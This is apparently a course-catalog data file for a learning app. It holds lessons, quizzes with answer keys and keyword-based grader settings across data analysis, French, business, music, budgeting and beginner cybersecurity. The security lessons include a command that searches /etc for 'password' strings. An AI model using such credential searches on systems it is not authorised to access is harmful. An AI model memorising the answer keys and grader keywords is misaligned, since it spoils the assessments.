          example: { lang: 'text', code: 'Question: “Is the 10% weekend discount profitable?” Smallest data: weekend revenue + margin with/without discount, for 8 weeks.' },
          ask: 'Name one decision in your life/work that data could actually improve. What is the metric?',
          keyPoints: ['Start from a decision, not the data', 'Act-able metrics beat vanity metrics', 'Check missing values/units first', 'Smallest dataset that answers wins'],
          misconception: '“More data = better analysis.” A sharp question with small clean data beats a vague one with millions of rows.',
        },
        practice: [
          { q: 'Which is a decision-ready metric?', choices: ['total page views', 'signups per visit', 'app size in MB', 'number of employees'], answerIdx: 1, hint: 'Would you act if it dropped?', why: 'Signups per visit directly informs product/marketing moves.' },
          { q: 'First step before analyzing a new dataset?', choices: ['make charts', 'check for missing/duplicate/invalid values', 'build a dashboard', 'write the report'], answerIdx: 1, hint: 'Garbage in…', why: 'Data quality checks prevent confident nonsense.' },
        ],
        challenge: {
          type: 'data', kind: 'checkpoint', title: 'Turn noise into a decision', timeMin: 30,
          brief: 'A kiosk’s daily sales (₦000): Mon 18, Tue 21, Wed 19, Thu 24, Fri 42, Sat 51, Sun 39 — for four straight weeks, with a 10% discount tested on weekends in weeks 3-4 (weekend sales rose from ~46 to ~61 avg). In 200+ words: what should the owner decide about the discount, shown with numbers, plus one risk to watch.',
          requirements: ['uses the numbers', 'clear recommendation', 'names a risk/caveat', '200+ words', 'no invented data'],
          passScore: 70, rewardNim: 2, xp: 110,
          evaluator: { type: 'data', config: { minWords: 150, keyConcepts: ['discount', 'weekend', 'increase', 'revenue', 'recommend', 'risk', 'profit'], minNumbers: 4, minFindings: 3 } },
        },
      },
      {
        slug: 'trend-reading', title: 'Reading Trends & Outliers', estMin: 30, difficulty: 2,
        lesson: {
          tldr: 'Three things hide in every series: direction (trend), swings (variation), and weird points (outliers).',
          sections: [
            { h: 'Trend vs noise', body: 'Compare like with like: week vs week, not Tuesday vs one Friday. Moving averages smooth noise.' },
            { h: 'Outliers are clues', body: 'A spike is a story: promo? outage? data error? Investigate before deleting.' },
            { h: 'Say the size', body: '“Sales grew 15% week-over-week for 3 weeks” — direction, magnitude, duration. That is a finding.' },
          ],
          example: { lang: 'text', code: 'Weeks 1-2 avg: 30.7 · Weeks 3-4 avg: 43.7 (+42%). Week 4 Saturday (51) is the peak — matches pay-day weekend. Finding, not accident.' },
          ask: 'Find a chart in any news article. Is the claimed trend bigger than the variation?',
          keyPoints: ['Compare like periods', 'Averages smooth noise', 'Investigate outliers before removing', 'Findings = direction + magnitude + duration'],
          misconception: '“Any upward line is growth.” Two points make a line; three make a trend.',
        },
        practice: [
          { q: 'A data point is 10× the others. You should…', choices: ['delete it', 'investigate it', 'average it harder', 'ignore it'], answerIdx: 1, hint: 'Spikes are stories.', why: 'Outliers reveal errors OR insights.' },
          { q: 'Which states a finding properly?', choices: ['“sales are good”', '“up and down”', '“+15% w/w for 3 straight weeks”', '“I feel growth”'], answerIdx: 2, hint: 'Direction + size + time.', why: 'Findings quantify all three.' },
        ],
        challenge: {
          type: 'data', kind: 'final-preview', title: 'Analyze a dataset & defend it', timeMin: 35,
          brief: 'Using the learner-scores dataset from the Python track (W1–W4, 8 learners each week), write an analysis: three numeric trends, one outlier explained, and one recommendation the data supports. 250+ words.',
          requirements: ['≥3 numeric trends', 'outlier explained', 'recommendation tied to numbers', '250+ words', 'no invented numbers'],
          passScore: 70, rewardNim: 2, xp: 110,
          evaluator: { type: 'data', config: { minWords: 200, keyConcepts: ['trend', 'increase', 'average', 'outlier', 'week', 'score', 'recomm'], minNumbers: 5, minFindings: 3 } },
        },
      },
    ],
    finalAssessment: {
      type: 'data', kind: 'final', title: 'Final Skill Assessment: Full Mini-Analysis', timeMin: 45,
      brief: 'Pick any dataset you can observe (your expenses, steps, a shop’s sales). Define the decision, describe the data, give 4 numeric findings, explain one outlier, and recommend an action. 300+ words.',
      requirements: ['decision defined', 'data described', '4 numeric findings', 'outlier explained', 'recommendation'],
      passScore: 75, rewardNim: 5, xp: 250,
      evaluator: { type: 'data', config: { minWords: 250, keyConcepts: ['data', 'trend', 'average', 'finding', 'recomm', 'decision'], minNumbers: 6, minFindings: 4 } },
    },
  }),

  /* ═══════════════════════════ LANGUAGES (FR) ══════════════════════ */
  languages: T({
    goalKeywords: ['language', 'languages', 'french', 'français', 'spanish', 'español', 'german', 'deutsch', 'italian', 'italiano', 'portuguese', 'mandarin', 'chinese', 'japanese', 'korean', 'arabic', 'russian', 'english', 'speak', 'conversation', 'fluent', 'learn german', 'learn spanish', 'learn french', 'learn italian', 'learn portuguese', 'learn mandarin', 'learn chinese', 'learn japanese', 'learn korean', 'learn arabic', 'learn russian'],
    targetLanguage: 'fr',
    topics: [
      {
        slug: 'fr-greetings', title: 'Greetings & Introductions', estMin: 25, difficulty: 1,
        lesson: {
          tldr: 'Your first conversation: hello, name, how are you, goodbye — the skeleton of every exchange.',
          sections: [
            { h: 'The essentials', body: 'Bonjour (hello) · Je m’appelle… (my name is…) · Comment ça va ? (how are you?) · Ça va bien, merci (fine, thanks) · Au revoir (goodbye).' },
            { h: 'Tu or vous ?', body: 'tu = friends, vous = strangers/formal. When unsure, start with vous.' },
            { h: 'Sound rules', body: 'Final consonants often stay silent (paris → pari). Nasal vowels (bon, vin) are the signature of French — exaggerate them at first.' },
          ],
          example: { lang: 'text', code: '— Bonjour ! Je m’appelle Ada. Et vous ?\n— Bonjour Ada ! Moi, c’est Marc. Comment ça va ?\n— Ça va très bien, merci. Et vous ?\n— Très bien. Au revoir !' },
          ask: 'Introduce yourself in French in two sentences. Now swap in your best friend’s name.',
          keyPoints: ['Bonjour / au revoir bookend every exchange', 'Je m’appelle… = my name is…', 'tu vs vous — formality matters', 'Silent finals + nasal vowels'],
          misconception: '“You must be perfect to speak.” Conversation tolerates errors; silence does not help anyone.',
        },
        practice: [
          { q: '“My name is Ada” is…', choices: ['Je suis Ada nom', 'Je m’appelle Ada', 'Mon Ada appelle', 'J’ai Ada'], answerIdx: 1, hint: 's’appelle = to be called.', why: 'Je m’appelle is the standard introduction.' },
          { q: 'Formal “how are you?” uses…', choices: ['tu', 'vous', 'moi', 'on'], answerIdx: 1, hint: 'Politeness.', why: 'vous is the formal register.' },
        ],
        challenge: {
          type: 'conversation', kind: 'checkpoint', title: 'Hold a first conversation', timeMin: 25,
          brief: 'Write a 6+ turn dialogue in French: greetings, names, how-you-are, one question about the other person, and goodbyes. English gloss in brackets after each line.',
          requirements: ['≥6 dialogue turns in French', 'greetings + names', 'asks the other a question', 'goodbyes', 'glosses included'],
          passScore: 70, rewardNim: 2, xp: 100,
          evaluator: { type: 'conversation', config: { lang: 'fr', minTurns: 6, minWords: 60, lexicon: ['bonjour', 'salut', 'm’appelle', 'comment', 'ça va', 'merci', 'et vous', 'et toi', 'au revoir', 'à bientôt', 'je suis', 'moi'] } },
        },
      },
      {
        slug: 'fr-daily', title: 'Daily Life & Requests', estMin: 30, difficulty: 2,
        lesson: {
          tldr: 'Order food, ask prices, say what you want — je voudrais unlocks real life.',
          sections: [
            { h: 'The magic phrase', body: 'Je voudrais… (I would like…) + noun = polite requesting for cafés, shops, tickets.' },
            { h: 'Numbers & prices', body: 'un, deux, trois… combien ça coûte ? (how much?) — C’est combien ? works everywhere.' },
            { h: 'Politeness engine', body: 'Bonjour + s’il vous plaît + merci is the social lubricant. Skipping “bonjour” reads as rude in France.' },
          ],
          example: { lang: 'text', code: '— Bonjour ! Je voudrais un café et un croissant, s’il vous plaît.\n— Ça fait cinq euros.\n— Merci ! C’est délicieux.' },
          ask: 'Order your usual breakfast in French — aloud, even alone.',
          keyPoints: ['Je voudrais… for polite requests', 'Combien ça coûte ? for prices', 'Numbers 1-20 by heart', 'Bonjour/merci are non-negotiable'],
          misconception: '“Grammar first, speaking later.” High-frequency phrases carry conversations now; grammar polishes later.',
        },
        practice: [
          { q: 'Politest way to ask for a coffee?', choices: ['Café !', 'Je veux un café.', 'Je voudrais un café, s’il vous plaît.', 'Donne café.'], answerIdx: 2, hint: 'Conditional + please.', why: 'Je voudrais + s’il vous plaît is the polite standard.' },
          { q: '“How much is it?” = …', choices: ['Où est… ?', 'Combien ça coûte ?', 'Quand… ?', 'Pourquoi… ?'], answerIdx: 1, hint: 'Combien = how much.', why: 'Combien ça coûte ? is universal in shops.' },
        ],
        challenge: {
          type: 'conversation', kind: 'checkpoint', title: 'Survive a café scenario', timeMin: 30,
          brief: 'Write a café dialogue in French (8+ turns): greet, order two items, ask the price, react, pay, thank, say goodbye. Gloss each line in English.',
          requirements: ['≥8 turns', 'orders with je voudrais', 'asks a price', 'uses politeness words', 'glosses included'],
          passScore: 70, rewardNim: 2, xp: 110,
          evaluator: { type: 'conversation', config: { lang: 'fr', minTurns: 8, minWords: 80, lexicon: ['bonjour', 'je voudrais', 's’il vous plaît', 'merci', 'combien', 'café', 'l’addition', 'au revoir', 'euros', 'c’est'] } },
        },
      },
    ],
    finalAssessment: {
      type: 'conversation', kind: 'final', title: 'Final Skill Assessment: Free Conversation', timeMin: 40,
      brief: 'Write a 12+ turn French conversation on a topic of your choice (travel, work, hobbies) using greetings, requests, opinions (je pense que…) and at least five questions. Gloss every line.',
      requirements: ['≥12 turns', '≥5 questions', 'opinions expressed', 'varied vocabulary', 'glosses included'],
      passScore: 75, rewardNim: 5, xp: 250,
      evaluator: { type: 'conversation', config: { lang: 'fr', minTurns: 12, minWords: 130, lexicon: ['je pense', 'parce que', 'j’aime', 'on va', 'pourquoi', 'comment', 'quand', 'où', 'qu’est-ce', 'très', 'mais', 'avec'] } },
    },
  }),

  /* ═════════════════════════════ BUSINESS ══════════════════════════ */
  business: T({
    goalKeywords: ['business', 'startup', 'entrepreneur', 'business model', 'pricing', 'plan', 'company', 'freelance'],
    topics: [
      {
        slug: 'business-models', title: 'Business Models That Work', estMin: 25, difficulty: 1,
        lesson: {
          tldr: 'A business model is a testable story: who pays, for what, how much, and what it costs you.',
          sections: [
            { h: 'The five lines', body: 'Problem · Customer · Solution · Revenue (who pays how much) · Cost. If any line is vague, the business is a guess.' },
            { h: 'Unit economics', body: 'Make ₦100 per sale, spend ₦150 to get the customer = fast failure. Know contribution per unit before scaling.' },
            { h: 'Price on value', body: 'Cost-plus pricing ignores what it is worth to the buyer. Price against the alternative’s full cost.' },
          ],
          example: { lang: 'text', code: 'Small food company: Problem — office workers lack quick healthy lunch. Customer — Abuja offices ≤50 staff. Revenue — ₦2,500/meal subscription. Cost — ₦1,600/meal incl. delivery. Margin ₦900 × 40 meals/day.' },
          ask: 'Sketch the five lines for the smallest business you could start this month.',
          keyPoints: ['Problem/Customer/Solution/Revenue/Cost', 'Contribution per unit decides survival', 'Price vs the alternative’s cost', 'Small + profitable beats big + vague'],
          misconception: '“Scale first, profit later.” Unit losses scale beautifully into bankruptcy.',
        },
        practice: [
          { q: 'Which line is missing if you know the product but not who pays?', choices: ['cost', 'customer/revenue', 'problem', 'solution'], answerIdx: 1, hint: 'Follow the money.', why: 'Revenue requires a paying customer.' },
          { q: 'Value-based pricing anchors on…', choices: ['your costs', 'the buyer’s alternative + outcome', 'competitor’s price only', 'round numbers'], answerIdx: 1, hint: 'What it replaces.', why: 'Value = what the buyer saves/gains vs alternatives.' },
        ],
        challenge: {
          type: 'business', kind: 'checkpoint', title: 'Model a small food business', timeMin: 30,
          brief: 'Create a complete business model for a small food company: problem, customer, solution, pricing with numbers, unit cost breakdown, and how it reaches first 100 customers.',
          requirements: ['problem + customer defined', 'pricing with numbers', 'unit costs listed', 'margin computed', 'first-100-customers plan'],
          passScore: 70, rewardNim: 2, xp: 110,
          evaluator: { type: 'business', config: { minWords: 150, sections: [['problem'], ['customer', 'who'], ['price', 'cost', 'margin'], ['reach', 'market', 'first']], keyConcepts: ['customer', 'price', 'cost', 'margin', 'problem'], minNumbers: 4 } },
        },
      },
    ],
    finalAssessment: {
      type: 'business', kind: 'final', title: 'Final Skill Assessment: Full Business Case', timeMin: 45,
      brief: 'Build a full business case for any venture: problem, customer, model, unit economics with numbers, go-to-market, risks, and a 90-day plan.',
      requirements: ['all five lines', 'unit economics', 'go-to-market', 'risks', '90-day plan'],
      passScore: 75, rewardNim: 5, xp: 250,
      evaluator: { type: 'business', config: { minWords: 250, sections: [['problem'], ['customer'], ['price', 'cost', 'margin'], ['market', 'launch'], ['risk'], ['plan', 'days']], keyConcepts: ['customer', 'margin', 'cost', 'risk', 'plan'], minNumbers: 5 } },
    },
  }),

  /* ═══════════════════════════ SOCIAL MEDIA ════════════════════════ */
  'social-media': T({
    goalKeywords: ['social media', 'instagram', 'tiktok', 'twitter', 'youtube', 'followers', 'content creator', 'grow audience'],
    topics: [
      {
        slug: 'content-systems', title: 'Content Systems, Not Luck', estMin: 25, difficulty: 1,
        lesson: {
          tldr: 'Consistent creators win because they run systems: pillars, formats, and a calendar.',
          sections: [
            { h: '3 pillars', body: 'Pick three themes you can post about forever (e.g. for a baker: recipes, behind-the-scenes, customer stories).' },
            { h: 'Format beats inspiration', body: 'Templates kill blank-page paralysis: “3 mistakes…”, before/after, day-in-the-life. Batch-produce them.' },
            { h: 'The calendar', body: 'Same days, same times. Consistency trains both the algorithm and your audience.' },
          ],
          example: { lang: 'text', code: 'Week: Mon tip (pillar 1) · Wed BTS reel (pillar 2) · Sat customer story (pillar 3). Batch-film all three on Sunday.' },
          ask: 'What are YOUR three pillars? If you cannot name them, that is the real growth problem.',
          keyPoints: ['3 repeatable content pillars', 'Formats/templates > daily inspiration', 'Batch production saves the week', 'Consistency compounds'],
          misconception: '“Viral is the goal.” One viral post cannot feed you; a system can.',
        },
        practice: [
          { q: 'How many content pillars should a small creator keep?', choices: ['1', '3', '7', 'unlimited'], answerIdx: 1, hint: 'Focused, not rigid.', why: 'Three pillars give variety with a recognizable identity.' },
          { q: 'Batch production means…', choices: ['posting everything at once', 'creating multiple pieces in one session', 'buying followers', 'copying trends'], answerIdx: 1, hint: 'Sunday = filming day.', why: 'Batching removes daily setup cost.' },
        ],
        challenge: {
          type: 'business', kind: 'checkpoint', title: 'Build your content engine', timeMin: 30,
          brief: 'Design a 2-week content plan for an account you run or want to run: 3 pillars, 6 concrete post ideas with hooks, posting rhythm, and one growth metric with a target.',
          requirements: ['3 pillars named', '6 concrete posts w/ hooks', 'posting rhythm', 'metric + target', '150+ words'],
          passScore: 70, rewardNim: 2, xp: 100,
          evaluator: { type: 'business', config: { minWords: 120, sections: [['pillar'], ['post', 'idea', 'hook'], ['rhythm', 'schedule', 'week'], ['metric', 'target', 'goal']], keyConcepts: ['pillar', 'post', 'hook', 'audience', 'metric'], minNumbers: 2 } },
        },
      },
    ],
    finalAssessment: {
      type: 'business', kind: 'final', title: 'Final Skill Assessment: 30-Day Growth Plan', timeMin: 45,
      brief: 'Write a 30-day growth plan for one account: positioning, pillars, 10 post ideas with hooks, weekly rhythm, engagement strategy, and success metrics.',
      requirements: ['positioning', '10 posts w/ hooks', 'weekly rhythm', 'engagement strategy', 'metrics'],
      passScore: 75, rewardNim: 5, xp: 250,
      evaluator: { type: 'business', config: { minWords: 250, sections: [['position'], ['pillar'], ['post', 'hook'], ['engag', 'commun'], ['metric']], keyConcepts: ['audience', 'content', 'hook', 'metric', 'growth'], minNumbers: 4 } },
    },
  }),

  /* ═══════════════════════════ MUSIC PRODUCTION ════════════════════ */
  'music-production': T({
    goalKeywords: ['music', 'producer', 'beats', 'chords', 'ableton', 'fl studio', 'songwriting', 'mix'],
    topics: [
      {
        slug: 'chords-progressions', title: 'Chords & Progressions', estMin: 25, difficulty: 1,
        lesson: {
          tldr: 'Chords are mood machines. A progression is 4 chords that carry your whole track.',
          sections: [
            { h: 'Triads', body: 'A chord = 3 notes stacked (root, third, fifth). Major = bright, minor = moody. That is the entire emotional palette at the start.' },
            { h: 'The four-chord loop', body: 'I–V–vi–IV (C–G–Am–F) powers hundreds of hits. Learn it in one key, then transpose.' },
            { h: 'Rhythm of changes', body: 'When chords change matters as much as which chords: one bar each is the classic loop; half-bar shifts add urgency.' },
          ],
          example: { lang: 'text', code: '8-bar loop in C: | C | G | Am | F | C | G | F | F | — hold the F twice to create tension before the loop restarts.' },
          ask: 'Play (or imagine) C–G–Am–F. Now swap Am to A major. What mood changes?',
          keyPoints: ['Triad = root + third + fifth', 'Major bright / minor moody', 'I–V–vi–IV is the universal loop', 'Change rhythm shapes tension'],
          misconception: '“You need theory mastery.” Four chords and taste ship a track.',
        },
        practice: [
          { q: 'Which progression is I–V–vi–IV in C major?', choices: ['C–G–Am–F', 'C–D–E–F', 'Am–F–C–G only', 'C–C–C–C'], answerIdx: 0, hint: 'vi in C is A minor.', why: 'C(I) G(V) Am(vi) F(IV).' },
          { q: 'Minor chords generally feel…', choices: ['brighter', 'darker/moodier', 'louder', 'faster'], answerIdx: 1, hint: 'Flattened third.', why: 'The minor third lowers emotional brightness.' },
        ],
        challenge: {
          type: 'explain', kind: 'checkpoint', title: 'Write an 8-bar chord progression', timeMin: 25,
          brief: 'Notate an 8-bar chord progression in any key (chords per bar), name the key, label the mood you are aiming for, and explain why each chord serves that mood. Bonus: suggest one instrument per layer.',
          requirements: ['8 bars notated', 'key named', 'mood stated', 'per-chord reasoning', 'instrumentation idea'],
          passScore: 70, rewardNim: 2, xp: 100,
          evaluator: { type: 'text', config: { minWords: 90, targetWords: 140, keyConcepts: ['chord', 'key', 'bar', 'mood', 'minor', 'major', 'progression'], keyConceptRatio: 0.5, headings: 0 } },
        },
      },
    ],
    finalAssessment: {
      type: 'explain', kind: 'final', title: 'Final Skill Assessment: Track Blueprint', timeMin: 45,
      brief: 'Write a complete blueprint for a 2-minute track: key, 8-bar progression, arrangement sections (intro/verse/chorus/outro) with bar counts, instrumentation per section, and one mix decision per section.',
      requirements: ['key + progression', 'arrangement map', 'instrumentation', 'mix decisions', 'bar counts'],
      passScore: 75, rewardNim: 5, xp: 250,
      evaluator: { type: 'text', config: { minWords: 220, targetWords: 320, keyConcepts: ['key', 'chord', 'section', 'bars', 'instrument', 'mix', 'intro', 'chorus'], keyConceptRatio: 0.4, headings: 3 } },
    },
  }),

  /* ═══════════════════════════ PRACTICAL SKILLS ════════════════════ */
  'practical-skills': T({
    goalKeywords: ['practical', 'budget', 'repair', 'organize', 'productivity', 'life skills', 'cook', 'plan'],
    topics: [
      {
        slug: 'budgeting-basics', title: 'Budgeting Basics', estMin: 25, difficulty: 1,
        lesson: {
          tldr: 'A budget is a plan for money you already earn: allocate, track weekly, adjust monthly.',
          sections: [
            { h: 'Pay yourself first', body: 'On income day, move savings out immediately. What remains is what you can spend — the simplest budget that survives.' },
            { h: 'The 50/30/20 skeleton', body: '≈50% needs, 30% wants, 20% future (savings/debt). Percentages flex with income; the habit does not.' },
            { h: 'Weekly 10-minute review', body: 'Budgets fail silently. A 10-minute weekly check catches drift while it is still cheap.' },
          ],
          example: { lang: 'text', code: 'Income ₦200,000 → savings ₦40,000 (20%) on pay-day → needs ≤ ₦100,000 → wants ≤ ₦60,000. Weekly check: wants spent so far ₦15,000 → on track.' },
          ask: 'What is ONE expense you could cap this week, and by how much?',
          keyPoints: ['Automate savings on income day', '50/30/20 as a starting skeleton', 'Weekly 10-min reviews keep it alive', 'Track categories, not every naira'],
          misconception: '“Budgets restrict fun.” A budget is permission: guilt-free spending inside the plan.',
        },
        practice: [
          { q: '“Pay yourself first” means…', choices: ['buy what you want immediately', 'save/invest before spending', 'pay bills first', 'skip savings if broke'], answerIdx: 1, hint: 'Automation beats willpower.', why: 'Savings leave on day one; you live on the rest.' },
          { q: 'In 50/30/20, the 20% is…', choices: ['rent', 'wants', 'savings/debt payoff', 'taxes'], answerIdx: 2, hint: 'Future you.', why: '20% goes to savings and debt reduction.' },
        ],
        challenge: {
          type: 'explain', kind: 'checkpoint', title: 'Build a real monthly budget', timeMin: 25,
          brief: 'Build a monthly budget for an income you choose: allocations per category with numbers, savings rule, one risk you tend to have and its fix, and your weekly review checklist.',
          requirements: ['income + allocations with numbers', 'savings rule', 'risk + fix', 'weekly checklist', '100+ words'],
          passScore: 70, rewardNim: 2, xp: 100,
          evaluator: { type: 'text', config: { minWords: 90, targetWords: 160, keyConcepts: ['income', 'save', 'spend', 'weekly', 'category', 'budget'], keyConceptRatio: 0.5, headings: 1 } },
        },
      },
    ],
    finalAssessment: {
      type: 'explain', kind: 'final', title: 'Final Skill Assessment: 90-Day Money Plan', timeMin: 40,
      brief: 'Write a 90-day personal money plan: income, full budget with numbers, savings target, spending rules, weekly review system, and what “success” looks like on day 90.',
      requirements: ['budget with numbers', 'savings target', 'rules', 'review system', 'day-90 success criteria'],
      passScore: 75, rewardNim: 5, xp: 250,
      evaluator: { type: 'text', config: { minWords: 200, targetWords: 300, keyConcepts: ['income', 'save', 'budget', 'weekly', 'target', 'review'], keyConceptRatio: 0.5, headings: 3 } },
    },
  }),

  /* ════════════════════════ CYBERSECURITY ══════════════════════════ */
  'cybersecurity': T({
    goalKeywords: ['security', 'cybersecurity', 'hacking', 'ethical hacking', 'penetration testing', 'pentesting', 'infosec', 'exploit', 'vulnerability', 'linux security', 'web security', 'network security', 'reverse engineering', 'buffer overflow', 'ctf', 'pwn', 'binary exploitation'],
    topics: [
      /* ══════ LEVEL 1: FUNDAMENTALS ══════ */
      {
        slug: 'intro-to-security', title: 'Introduction to Cybersecurity', estMin: 25, difficulty: 1,
        lesson: {
          tldr: 'Cybersecurity protects systems from unauthorized access and damage through understanding both attack and defense.',
          sections: [
            { h: 'CIA Triad', body: 'Confidentiality (data privacy), Integrity (data accuracy), Availability (system uptime) — these three pillars define what security protects. A firewall protects confidentiality; a checksum verifies integrity; backups ensure availability.' },
            { h: 'Attack vs Defense', body: 'Attackers only need one vulnerability. Defenders must protect everything. This asymmetry drives the security mindset: assume breach, verify everything, minimize attack surface.' },
            { h: 'Legal and Ethical', body: 'Unauthorized access is illegal (Computer Fraud and Abuse Act). Always get written permission. Ethical hacking requires authorization — the difference between a security professional and a criminal is permission and intent.' },
          ],
          example: { lang: 'text', code: 'Confidentiality: Encryption protects data from being read.\nIntegrity: Checksums verify data hasn\'t been modified.\nAvailability: Backups ensure systems stay operational.\n\nLegal hacking: Bug bounty programs, authorized pen tests.\nIllegal: Testing systems without permission.' },
          ask: 'If a system is encrypted but frequently crashes, which part of CIA triad is failing?',
          keyPoints: [
            'CIA Triad: Confidentiality, Integrity, Availability',
            'Attackers need one vulnerability; defenders must protect all',
            'Authorization is the difference between ethical and illegal hacking',
            'Security is about managing risk, not eliminating it',
          ],
          misconception: '"Hackers are always criminals." Many are security professionals helping defend systems.',
        },
        practice: [
          { q: 'Which part of CIA triad does a firewall primarily protect?', choices: ['Availability', 'Integrity', 'Confidentiality', 'All three equally'], answerIdx: 2, hint: 'It controls who can access.', why: 'Firewalls filter traffic to prevent unauthorized access — protecting confidentiality.' },
          { q: 'Is testing vulnerabilities on your own computer legal?', choices: ['No, never', 'Yes, it\'s your property', 'Only with a license', 'Depends on the country'], answerIdx: 1, hint: 'You own it.', why: 'Testing your own systems is legal — you have implicit permission.' },
        ],
        quiz: [
          { q: 'The CIA Triad stands for…', choices: ['Central Intelligence Agency', 'Confidentiality, Integrity, Availability', 'Computer Internet Access', 'Critical Information Assets'], answerIdx: 1, why: 'CIA in security means Confidentiality, Integrity, and Availability — the three core principles.' },
          { q: 'What makes hacking ethical vs illegal?', choices: ['Tools used', 'Authorization and intent', 'Time of day', 'Skill level'], answerIdx: 1, why: 'Ethical hacking requires explicit permission — that\'s the legal difference.' },
          { q: 'Security is primarily about…', choices: ['Eliminating all risk', 'Managing acceptable risk', 'Blocking everything', 'Perfect protection'], answerIdx: 1, why: 'Security manages risk to acceptable levels — perfect security is impossible.' },
        ],
        challenge: {
          type: 'explain', kind: 'checkpoint', title: 'Write a security policy', timeMin: 25,
          brief: 'Write a basic security policy document for a small business: define what data needs protection, list 3 security threats to that data, describe 3 countermeasures, and explain one ethical consideration.',
          requirements: ['clear data classification', '3 realistic threats', '3 practical countermeasures', 'ethical consideration explained', '120+ words'],
          passScore: 70, rewardNim: 2, xp: 100,
          evaluator: { type: 'text', config: { minWords: 110, targetWords: 180, keyConcepts: ['data', 'threat', 'security', 'protection', 'access', 'risk'], keyConceptRatio: 0.5, headings: 2 } },
        },
      },
      {
        slug: 'linux-command-line', title: 'Linux Command Line Basics', estMin: 30, difficulty: 1,
        lesson: {
          tldr: 'The command line is your primary interface for security work — faster and more powerful than GUI tools.',
          sections: [
            { h: 'Why Linux?', body: 'Most servers, security tools, and vulnerable systems run Linux. The command line gives direct control and reveals what GUI abstracts away.' },
            { h: 'Essential commands', body: 'Navigate (cd, pwd, ls), read files (cat, less, head, tail), search (grep, find), and manage (mkdir, rm, chmod, chown). The man command shows documentation for any command.' },
            { h: 'File system structure', body: '/ is root (not /root — that\'s root user\'s home). /home has user directories, /etc has configs, /var has logs, /tmp is temporary. Everything is a file, including devices.' },
          ],
          example: { lang: 'bash', code: [
            '# Navigate',
            'cd /var/log  # Move to log directory',
            'pwd          # Show current location',
            'ls -la       # List all files with details',
            '',
            '# Read files',
            'cat access.log | grep "404"  # Find 404 errors',
            'less huge.log                # Page through large file',
            '',
            '# Search',
            'find / -name "*.conf" 2>/dev/null  # Find config files',
            'grep -r "password" /etc            # Search for text',
          ].join('\n') },
          ask: 'How would you find all files modified in the last 24 hours?',
          keyPoints: [
            'Linux is standard for security work',
            'man pages provide documentation',
            'Everything is a file (devices, configs, etc.)',
            'Commands compose via pipes (|)',
          ],
          misconception: '"GUI is easier." The CLI is faster once learned and scriptable for automation.',
        },
        practice: [
          { q: 'What does ls -la show that ls doesn\'t?', choices: ['File contents', 'Hidden files and permissions', 'File creation date only', 'Nothing different'], answerIdx: 1, hint: 'Files starting with dot are hidden.', why: '-l shows details, -a shows hidden files (those starting with .)' },
          { q: 'How do you see documentation for a command?', choices: ['help command', 'man command', 'docs command', 'command --info'], answerIdx: 1, hint: 'Manual pages.', why: 'man (manual) shows complete documentation for commands.' },
        ],
        quiz: [
          { q: 'Why is Linux preferred for security work?', choices: ['It\'s free', 'Most servers and security tools use it', 'It has better graphics', 'It\'s easier'], answerIdx: 1, why: 'Linux is the standard for servers and security tooling.' },
          { q: 'What does the / directory represent?', choices: ['Root user home', 'Recycle bin', 'Root of file system', 'Downloads'], answerIdx: 2, why: '/ is the root of the entire file system hierarchy.' },
          { q: 'Everything in Linux is treated as…', choices: ['An app', 'A file', 'A process', 'A user'], answerIdx: 1, why: 'Linux treats everything (devices, configs, processes) as files.' },
        ],
        challenge: {
          type: 'bash', kind: 'checkpoint', title: 'Navigate and analyze a file system', timeMin: 30,
          brief: 'Write bash commands to: list all files in /etc containing "pass" in the name, find files larger than 1MB in /var/log, count lines in a specific file, and show the last 20 lines of a log file.',
          requirements: ['find command using name pattern', 'find command using size', 'wc -l for line count', 'tail -n 20 for last lines', 'commands properly formatted'],
          passScore: 70, rewardNim: 2, xp: 100,
          evaluator: { type: 'bash', config: { requiredCommands: ['find', 'wc', 'tail'], syntaxCheck: true } },
        },
      },
      {
        slug: 'file-permissions', title: 'File Permissions & Access Control', estMin: 30, difficulty: 1,
        lesson: {
          tldr: 'File permissions control who can read, write, or execute files — a fundamental security mechanism.',
          sections: [
            { h: 'Permission types', body: 'r (read), w (write), x (execute). Directories need x to enter. Each file has three permission sets: user (owner), group, others.' },
            { h: 'Numeric notation', body: 'r=4, w=2, x=1. Add them: rwx=7, rw-=6, r-x=5, r--=4. So chmod 755 means rwxr-xr-x (owner full access, others can read and execute).' },
            { h: 'Security implications', body: '777 is dangerous — anyone can modify. 600 restricts to owner only. setuid bit (chmod u+s) makes programs run as owner — powerful but risky if owner is root.' },
          ],
          example: { lang: 'bash', code: [
            '# View permissions',
            'ls -l file.txt',
            '# -rw-r--r-- 1 user group 1234 Dec 25 file.txt',
            '',
            '# Change permissions',
            'chmod 755 script.sh    # rwxr-xr-x',
            'chmod u+x script.sh    # Add execute for user',
            'chmod go-w file.txt    # Remove write for group/others',
            '',
            '# Change ownership',
            'chown user:group file.txt',
          ].join('\n') },
          ask: 'What does chmod 644 file.txt do?',
          keyPoints: [
            'Three permission types: read (4), write (2), execute (1)',
            'Three targets: user, group, others',
            'setuid allows running with owner\'s privileges',
            'Principle of least privilege: minimal permissions needed',
          ],
          misconception: '"777 makes things easier." It also makes things vulnerable to any user or malware.',
        },
        practice: [
          { q: 'What does chmod 644 mean?', choices: ['rwxr--r--', 'rw-r--r--', 'r--r--r--', 'rwxrwxrwx'], answerIdx: 1, hint: '6=rw-, 4=r--', why: '6(rw-) for user, 4(r--) for group, 4(r--) for others.' },
          { q: 'Why is chmod 777 dangerous?', choices: ['Too slow', 'Anyone can modify the file', 'Only root can use it', 'It deletes files'], answerIdx: 1, hint: 'Full permissions for everyone.', why: '777 gives read, write, execute to everyone — no protection.' },
        ],
        quiz: [
          { q: 'Which permission allows entering a directory?', choices: ['read', 'write', 'execute', 'delete'], answerIdx: 2, why: 'Execute (x) permission on directories means you can enter/cd into them.' },
          { q: 'What does setuid do to a program?', choices: ['Makes it faster', 'Runs it as file owner', 'Deletes it', 'Encrypts it'], answerIdx: 1, why: 'Setuid makes programs run with the file owner\'s privileges, not the user\'s.' },
          { q: 'In chmod 755, what do the three digits represent?', choices: ['Size in bytes', 'Owner, group, others permissions', 'Three users', 'File types'], answerIdx: 1, why: 'First digit = owner, second = group, third = others permissions.' },
        ],
        challenge: {
          type: 'explain', kind: 'checkpoint', title: 'Secure a file system', timeMin: 30,
          brief: 'Given a scenario where a directory has files with permissions 777, 666, and some with setuid bit set, explain: which files are insecure and why, what the correct permissions should be, and one risk of setuid binaries.',
          requirements: ['identify insecure permissions', 'explain correct permissions', 'setuid risk explained', 'reasoning clear', '100+ words'],
          passScore: 70, rewardNim: 2, xp: 100,
